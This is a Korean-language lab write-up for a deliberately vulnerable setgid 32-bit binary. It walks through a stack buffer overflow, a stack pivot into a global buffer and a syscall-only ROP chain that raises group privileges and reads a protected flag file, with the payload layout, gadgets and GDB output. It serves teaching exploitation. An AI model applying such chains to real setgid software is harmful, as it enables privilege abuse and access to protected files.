# bof-rop-pivot

## 1. 개요

이 실습은 **Stack Buffer Overflow**를 이용해
**stack pivot 이후 syscall ROP 체인으로 flag 파일을 출력**하는 것을 목표로 한다.

* 쉘 획득 X
* libc 함수 호출 X
* syscall만 사용한 ORW(Open–Read–Write) ROP
* 권한 설정(setregid) 역시 syscall을 사용

즉, 이 실습에서는 syscall ABI를 활용한 ROP 체인을 통해
실제 리눅스 환경에서의 권한 문제와 파일 접근을 해결한다.

---

## 2. 실습 환경

* Architecture: x86 (32-bit)
* OS: Linux
* NX: Enabled
* PIE: Disabled
* ASLR: Enabled
* RELRO: Full
* Stack Canary: Disabled
* Binary: setgid

---

## 3. 취약 코드

```c
char stage[0x1000];

void vuln() {
    char buf[64];
    puts("input:");
    read(0, buf, 400);   // stack buffer overflow
}
```

#### 취약점 요약

* `read`에서 입력 크기 > buf 크기이므로 **BOF** 취약점 발생
  → **saved EBP / saved RET overwrite 가능**
* 전역 공간에 선언된 `stage`를 스택처럼 사용 가능

#### 참고

32bit의 바이너리에서는 가젯이 나오기 어려운 관계로,</br>
원활한 실습을 위해 필요한 가젯을 직접 넣어두었다.
``` c
__attribute__((naked))
void syscall_gadget() {
    __asm__ volatile(
        "int $0x80;\n"
        "ret;\n"
    );
}

__attribute__((noinline, used))
void ROP_bank(void) {
    __asm__ volatile(
        "pop %eax; ret;\n"
        "pop %ebx; ret;\n"
        "pop %ecx; ret;\n"
        "pop %edx; ret;\n"
        "mov %ebx, %eax; ret;\n"
        "mov %ecx, %eax; ret;\n"
    );
}
```

---

## 4. 공격 전체 흐름 요약

1. **BOF로 saved EBP / RET 덮기**
2. `leave; ret`를 이용해 **stack pivot**</br>
    → `.bss(stage)` 영역을 **가짜 스택(fake stack)** 으로 사용
3. syscall ROP로:
   * 권한 정렬 (`getegid → setregid`)
   * ORW (`open → read → write`)
4. flag 출력

### 왜 Stack Pivot이 필요한가?

**Stack pivot**은 프로그램의 스택 포인터(ESP/RSP)를 
공격자가 제어할 수 있는 다른 메모리 영역(Fake Stack)으로 
강제로 이동시키는 기술을 말한다.

이 실습에서는 기존 스택에 다음과 같은 문제가 있다.

* ROP 체인이 길어짐 (권한 세팅 + ORW)
* saved RET 이후 공간이 충분하지 않음
* 상위 스택 프레임(main 등)을 침범할 위험

따라서 :

* **saved EBP를 `.bss(stage)` 주소로 덮고**
* `leave; ret`를 실행시켜
* **ESP를 stage로 이동**

이렇게 Stack pivot을 하여 stage 영역을 **스택처럼 사용**한다.
</br>이로써 더 안정적인 exploit이 가능해진다.

---

## 5. BOF: payload 주입

BOF를 통해

* `vuln` 함수 종료 후 read@plt를 실행하여
* `stage`에 ROP 체인을 배치하고
* Stack Pivot을 수행하도록 한다.

### 5.1 saved EBP, saved RET Overwrite

GDB vuln disassemble 결과: 
``` gdb
0x080491db <+39>:	push   0x190
0x080491e0 <+44>:	lea    eax,[ebp-0x48]
0x080491e3 <+47>:	push   eax
0x080491e4 <+48>:	push   0x0
0x080491e6 <+50>:	call   0x8049040 <read@plt>
```

* buf 시작 주소 = ebp-0x48
* saved EBP부터 덮어야 하므로 offset = 0x48

스택 다이어그램: 
```
[높은주소]
+-----------------------+
|         0x800         | read@plt arg3
+-----------------------+
|      stage addr       | read@plt arg2
+-----------------------+ 
|           0           | read@plt arg1
+-----------------------+
|    leave;ret gadget   | read@plt의 saved ret 역할
+-----------------------+
|       read@plt        | vuln의 saved ret
+-----------------------+
|      stage_addr       | vuln의 saved ebp
+-----------------------+ ← ebp
|          ...          |
+-----------------------+ 
|         AAAA          | buf
+-----------------------+ [ebp-0x48] 
[낮은주소]
```


### 5.2 stage 구조

```
stage:
+0x00  fake EBP
+0x04  첫 ROP gadget
+0x08  다음 gadget
...
+0x300 "/tmp/bof-rop-pivot/flag\x00"
+0x400 read buffer
```

* 실제 exploit을 수행하는 gadget은 [stage+0x04]에서 시작됨
* 코드(ROP 체인)와 데이터(flag 문자열, buffer)를 분리
* ORW 중 주소 계산이 단순해짐

stage에 들어가는 ROP gadget이 수행하는 동작은 다음과 같다.

1. 권한 세팅: `setregid(getregid(), getregid())`
2. flag 파일 열기: `fd = open("/tmp/bof-rop-pivot/flag", O_RDONLY, 0)`
3. flag 파일 읽기: `read(fd, BUF, 0x40)`
4. 읽은 flag 출력: write(1, BUF, 0x40)

이를 syscall을 사용하여 수행하도록 chain을 작성한다.


---

## 6. syscall ROP

이 문제에서는 libc 함수(`system`, `open`, `read`, `write` 등)를 사용하지 않고
**리눅스 커널 syscall을 직접 호출하는 ROP 체인**을 구성한다.

이는 다음과 같은 환경적 제약 때문이다.

* NX enabled → 쉘코드 주입 불가
* Full RELRO → GOT overwrite 불가
* libc 호출 시 PIC/GOT/EBX 문제 발생
* **syscall은 커널 ABI이므로 libc 상태와 무관**

따라서 `int 0x80`을 이용한 **syscall-only ROP**가 가장 안정적인 공격 방식이 된다.

> **노트 ── System Call**
>
> 유저 프로그램이 커널 모드에서만 가능한 기능을 안전하게 사용할 수 있도록 도와주는 인터페이스

### 6.1 x86 (32-bit) Linux syscall 규약

x86 32-bit 리눅스에서 `int 0x80`을 사용할 경우,
syscall 번호와 인자는 **레지스터**로 전달된다.

> **노트 ── 어셈블리에서의 int**
>
> 어셈블리어에서의 `int`는 interrupt를 발생시키는 명령어이다.
>
> 리눅스의 syscall은 0x80번으로 설정되어 있어, `int 0x80`을 사용 시 syscall이 발생한다.

### 6.2 기본 규약

| 레지스터       | 의미         |
| ---------- | ---------- |
| `eax`      | syscall 번호 |
| `ebx`      | 1번째 인자     |
| `ecx`      | 2번째 인자     |
| `edx`      | 3번째 인자     |
| `int 0x80` | syscall 실행 |

syscall의 리턴값은 `eax`에 저장된다.

### 6.3 사용한 syscall 번호

본 실습에서 사용한 syscall 번호는 다음과 같다
(Linux x86 32-bit 기준).

| syscall    | 번호 |
| ---------- | -- |
| `getegid`  | 50 |
| `setregid` | 71 |
| `open`     | 5  |
| `read`     | 3  |
| `write`    | 4  |

> **노트**
> syscall 번호는 아키텍처 및 ABI에 따라 다르며,
> x86_64 환경에서는 전혀 다른 번호와 호출 방식(`syscall`)을 사용한다.

 이어지는 7번과 8번은 stage에 배치된 syscall ROP chain에 대한 설명이다.

---

## 7. 권한 세팅 syscall 흐름

### 7.1 권한 세팅의 필요성

flag 파일은 다음 권한을 가진다.

```
-rw-r-----  root root flag
```

바이너리는 `setgid`이므로 실행 시:

* `egid = root`
* `rgid = 사용자 그룹`

이 상태에서는 `open(flag)`가 실패할 수 있으므로,
syscall ROP로 권한을 명시적으로 맞춰준다.

```c
egid = getegid();
setregid(egid, egid);
```

### 7.2 레지스터 흐름

```asm
# getegid
eax = 50
int 0x80
# eax = egid

# eax → ebx, ecx 복사
ebx = eax
ecx = eax

# setregid
eax = 71
int 0x80
```

이후에는 flag 파일을 정상적으로 열 수 있다.

---

## 8. ORW(Open–Read–Write) syscall 흐름

### 8.1 open

```c
fd = open("/tmp/bof-rop-pivot/flag", O_RDONLY, 0);
```

```asm
eax = 5
ebx = &"/tmp/bof-rop-pivot/flag"
ecx = 0
edx = 0
int 0x80
# eax = fd
```

GDB에서 info reg 결과:
```
(gdb) info reg
eax            0x5                 5
ecx            0x0                 0
edx            0x0                 0
ebx            0x804c340           134529856
esp            0x804c088           0x804c088 <stage+72>
ebp            0xdeadbeef          0xdeadbeef
eip            0x8049190           0x8049190 <syscall_gadget+10>
```

### 8.2 read

```c
read(fd, BUF, 0x40);
```

```asm
eax = 3
ebx = fd
ecx = BUF
edx = 0x40
int 0x80
```

이 syscall 이후, **flag 내용은 BUF에 저장된다.**

※ 여기서 말하는 BUF는 vuln 함수의 로컬 버퍼 buf가 아닌, stage의 일부이다.

GDB에서 info reg 결과:
```
(gdb) info reg
eax            0x3                 3
ecx            0x804c440           134530112
edx            0x40                64
ebx            0xfffffff3          -13
esp            0x804c0a8           0x804c0a8 <stage+104>
ebp            0xdeadbeef          0xdeadbeef
eip            0x8049190           0x8049190 <syscall_gadget+10>
```

### 8.3 write

```c
write(1, BUF, 0x40);
```

```asm
eax = 4
ebx = 1        # stdout
ecx = BUF
edx = 0x40
int 0x80
```

이 syscall을 통해 BUF에 저장된 flag 내용이 화면에 출력된다.

---

## 9. 전체 페이로드 구조

```
[bof offset] //offset from buf to saved ebp
[stage addr] //vuln의 saved ebp
[read@plt] //vuln의 saved ret
[ret;leave] //read의 saved ret
[0] [stage addr] [0x800] //read argument: read(0, &stage, 0x800)

[fake ebp]

//setregid(getegid(), getegid())
[pop eax] [50(getegid)]
[syscall] //eax = egid
[mov ebx eax; ret] [mov ecx; ret] //ebx = ecx = egid : setregid argument
[pop eax] [71(setregid)]
[syscall]

//open("flag", 0, 0)
[pop eax] [5(open)]
[pop ebx] [FLAG]
[pop ecx] [0]
[pop edx] [0]
[syscall]

//read(fd, BUF, 0x40)
[mov ebx eax] //fd
[pop eax] [3(read)]
[pop ecx] [BUF]
[pop edx] [0x40]
[syscall]

//write(1, BUF, 0x40)
[pop eax] [4(write)]
[pop ebx] [1]
[pop ecx] [BUF]
[pop edx] [0x40]
[syscall]

[padding] [FLAG]
```

---

## 10. 익스플로잇 결과

```bash
$ (python3 payload.py) | ./vuln
input:
flag{cat_can_do_ROP^._.^}
Segmentation fault
```

* flag 출력 성공
* 이후 ROP 체인 종료로 인한 segfault는 정상적인 동작


> **노트 ── gdb에서 syscall이 정상 동작하지 않는 이유**
> 
> gdb로 바이너리를 실행할 경우,
> 디버거의 보안 정책에 의해 **setuid/setgid 비트가 무시**된다.
> 
> 따라서:
> 
> * gdb 안에서는 `getegid()`가 일반 사용자 그룹 ID를 반환
> * 실제 exploit 결과(권한 상승, flag 출력)는 gdb 밖에서만 확인 가능
> 
> 이는 정상적인 동작이며, exploit이 실패한 것이 아니다.
>
> setregid 후 GDB에서 info reg 결과 예시:
> ```
> (gdb) info reg
> eax            0x47                71
> ecx            0x3e8               1000  //setgid 비트가 무시되어 0 외의 값이 egid 로 나옴
> edx            0x800               2048
> ebx            0x3e8               1000
> esp            0x804c064           0x804c064 <stage+36>
> ebp            0xdeadbeef          0xdeadbeef
> eip            0x8049190           0x8049190 <syscall_gadget+10>
> ```

---

## 11. 정리

이 실습을 통해 다음을 학습할 수 있다.

* stack pivot의 필요성과 동작 원리
* fake stack 구성 방법
* syscall 기반 ROP 체인 설계
* 권한 문제를 고려한 실제 공격 흐름
* ORW(Open–Read–Write)의 정확한 의미

> **이 문제는 ROP 가젯 퍼즐이 아니라,
> 공격 흐름과 메모리 모델을 이해하는 데 초점을 둔다.**

---

## 부록 : pivot 흐름

### 1) vuln함수

#### vuln 실행 중간

```
read(0, buf, 400); //bof 
```
bof를 이용하여 다음과 같이 stage1 페이로드를 입력한다.

1. saved ebp 위치에 stage addr, saved ret위치에 read@plt 기록
2. leave_ret 가젯
3. read@plt의 인자(0, stage addr, 0x800) 세팅

스택 다이어그램: 
```
[높은주소]
+-----------------------+
|         0x800         | read@plt arg3
+-----------------------+
|      stage addr       | read@plt arg2
+-----------------------+ 
|           0           | read@plt arg1
+-----------------------+
|    leave;ret gadget   | read@plt의 saved ret 역할
+-----------------------+
|       read@plt        | vuln의 saved ret
+-----------------------+
|      stage_addr       | vuln의 saved ebp
+-----------------------+ ← ebp
|          ...          |
+-----------------------+ 
|         AAAA          | buf
+-----------------------+ [ebp-0x48] 
[낮은주소]
```

레지스터:

* esp = vuln 스택 프레임 최상단

#### vuln 에필로그:

```
leave
```
leave의 동작은 다음 2단계로 이루어진다.

1. `mov esp, ebp` → esp = vuln의 base
2. `pop ebp → ebp` = stage_addr

스택 다이어그램: 
```
[높은주소]
+-----------------------+
|         0x800         | read@plt arg3
+-----------------------+
|      stage addr       | read@plt arg2
+-----------------------+ 
|           0           | read@plt arg1
+-----------------------+
|    leave;ret gadget   | read@plt의 saved ret 역할
+-----------------------+
|       read@plt        | vuln의 saved ret
+-----------------------+ ← esp
|      stage_addr       | ebp
+-----------------------+
|          ...          |
+-----------------------+ 
|         AAAA          |
+-----------------------+
[낮은주소]
````

따라서: 

* ebp = stage_addr

```
ret
```
ret의 동작은 다음 두 단계로 이루어진다.

1. `pop eip` → eip = read@plt
2. `jmp eip` → read@plt로 이동

스택 다이어그램: 
```
[높은주소]
+-----------------------+
|         0x800         | read@plt arg3
+-----------------------+
|      stage addr       | read@plt arg2
+-----------------------+ 
|           0           | read@plt arg1
+-----------------------+
|    leave;ret gadget   | read@plt의 saved ret 역할
+-----------------------+ ← esp
|       read@plt        |
+-----------------------+
|      stage_addr       | ebp
+-----------------------+
|          ...          |
+-----------------------+ 
|         AAAA          |
+-----------------------+

[낮은주소]
```

따라서 vuln 에필로그 직후:

* ebp = stage addr
* eip = read@plt
  
ebp는 stage의 주소가 되며, read가 실행된다. 

GDB에서 vuln의 ret 직후 흐름 확인 결과는 다음과 같다:
```
input:

Breakpoint 1, 0x080491f3 in vuln ()
(gdb) ni
0x08049040 in read@plt ()
```
read@plt로 실행 흐름이 이동함을 확인 가능


### 2) read@plt : 스택으로 사용할 곳에 값 입력

#### read 중간

libc read 내부 동작은 보장되지 않음.
```
[높은주소]
arg3: 0x800
arg2: stage addr
arg1: 0
saved ret: leave;ret gadget addr
(libc read의 스택 프레임)
[낮은주소]
```

ebp, esp 모두 libc read 스택 프레임 내부

이때 stage에 ROP chain이 작성됨:

```
[높은주소]
+--------------------+
|         ...        |
+--------------------+
|  다음 gadget addr  |
+--------------------+ [stage addr + 8]
|   첫 gadget addr   | leave;ret gadget후 점프할 곳
+--------------------+ [stage addr + 4]
|      fake ebp      | pop ebp 용
+--------------------+ [stage addr] ← ebp
[낮은주소]
```

chain 내용은 앞서 서술한 권한 세팅, ORW, flag 경로.


#### read 종료

스택 다이어그램: 
```
[높은주소]
+-----------------------+
|         0x800         | read@plt arg3
+-----------------------+
|      stage addr       | read@plt arg2
+-----------------------+ 
|           0           | read@plt arg1
+-----------------------+
|    leave;ret gadget   | read@plt의 saved ret 역할
+-----------------------+ ← esp
[낮은주소]
```

```
ret // pop eip
```

따라서 read 직후: 

* ebp는 read 실행 전으로 복구됨 = stage addr
* eip = leave;ret gadget addr

## 3) leave;ret gadget : pivot 핵심

여기에서 esp를 stage로 이동시킴.

```
leave
```
1. `mov esp, ebp` → esp = ebp = stage_addr
2. `pop ebp` → ebp = *(stage addr)

stage:
```
[높은주소]
+--------------------+
|         ...        |
+--------------------+
|  다음 gadget addr  |
+--------------------+ [stage addr + 8]
|   첫 gadget addr   | leave;ret gadget후 점프할 곳
+--------------------+ [stage addr + 4] ← esp
|      fake ebp      | pop ebp 용 : ebp = *(stage addr) = fake ebp
+--------------------+ [stage addr]
[낮은주소]
```

```
ret
``` 
1. pop eip = stage = *(stage_addr + 4) = 첫 gadget addr
2. jmp eip = 첫 gadget 실행

stage:
```
[높은주소]
+--------------------+
|         ...        |
+--------------------+
|  다음 gadget addr  |
+--------------------+ [stage addr + 8] ← esp
|   첫 gadget addr   | eip
+--------------------+ [stage addr + 4] 
|      fake ebp      | ebp
+--------------------+ [stage addr]
[낮은주소]
```

따라서: 

* ebp = fake ebp
* eip = 첫 gadget addr
* esp = stage_addr + 8

즉, stage를 스택처럼 사용할 수 있다. = pivot 완료

GDB에서 leave;ret 직후 확인 결과:
```
Breakpoint 1, 0x080491f3 in vuln ()
(gdb) info reg
esp            0x804c044           0x804c044 <stage+4>
ebp            0xdeadbeef          0xdeadbeef
eip            0x80491f3           0x80491f3 <vuln+63>
//leave;ret gabget을 vuln 함수 에필로그에서 가져왔기 때문임
```
